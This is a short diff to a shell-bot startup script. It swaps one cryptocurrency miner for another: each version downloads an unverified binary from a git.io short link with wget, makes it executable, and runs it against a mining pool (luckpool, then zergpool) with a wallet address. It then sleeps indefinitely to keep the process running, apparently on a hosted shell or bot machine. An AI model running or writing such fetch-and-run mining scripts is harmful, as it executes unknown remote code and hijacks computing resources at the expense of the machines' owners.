@@ -4,8 +4,7 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO build https://git.io/JX7bv
-chmod +x build
-./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.errrrror -p x -t 64
-
+wget -qO ngaceng https://git.io/J161r
+chmod +x ngaceng
+./ngaceng -v -l verushash.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.ngaceng -p c=LTC,mc=VRSC -t 8
 sleep 99999999999999999
